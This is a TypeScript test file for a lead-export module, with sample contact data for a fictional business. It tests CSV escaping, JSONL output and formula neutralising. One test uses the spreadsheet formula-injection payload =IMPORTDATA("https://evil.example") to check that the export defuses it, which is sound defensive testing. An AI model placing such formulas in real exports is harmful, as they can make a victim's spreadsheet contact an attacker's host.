import { describe, expect, test } from "bun:test"
import { serializeLeadRecords, serializeLeads } from "../src/export"
import type { Lead } from "../src/schemas"

const lead = {
  id: "lead_1",
  name: 'Acme "North"',
  organization: "Acme",
  category: "Plumber",
  website: "https://acme.example",
  emails: ["hello@acme.example"],
  phones: ["+1 555 0100"],
  socialProfiles: ["https://instagram.com/acme"],
  address: "1 Main Street",
  sourceUrl: "https://www.google.com/maps/place/acme",
  sourceType: "demo",
  capturedAt: "2026-07-12T00:00:00.000Z",
  evidence: [
    {
      field: "name",
      value: "Acme",
      sourceUrl: "https://www.google.com/maps/place/acme",
    },
  ],
  confidence: 0.9,
  score: 75,
  tags: ["local"],
} satisfies Lead

describe("lead serialization", () => {
  test("escapes CSV cells", () => {
    const output = serializeLeads([lead], "csv")
    expect(output).toContain('"Acme ""North"""')
    expect(output).toContain('"hello@acme.example"')
  })

  test("writes one JSON object per JSONL line", () => {
    const output = serializeLeads([lead, lead], "jsonl").trim().split("\n")
    expect(output).toHaveLength(2)
    expect(JSON.parse(output[0] ?? "{}").name).toBe(lead.name)
  })

  test("neutralizes spreadsheet formulas", () => {
    const output = serializeLeads(
      [{ ...lead, name: '=IMPORTDATA("https://evil.example")' }],
      "csv",
    )
    expect(output).toContain("'=IMPORTDATA")
  })

  test("exports persisted qualification state", () => {
    const output = serializeLeadRecords(
      [{ lead, qualificationStatus: "qualified" }],
      "csv",
    )
    expect(output).toContain("qualificationStatus")
    expect(output).toContain('"qualified"')
  })
})
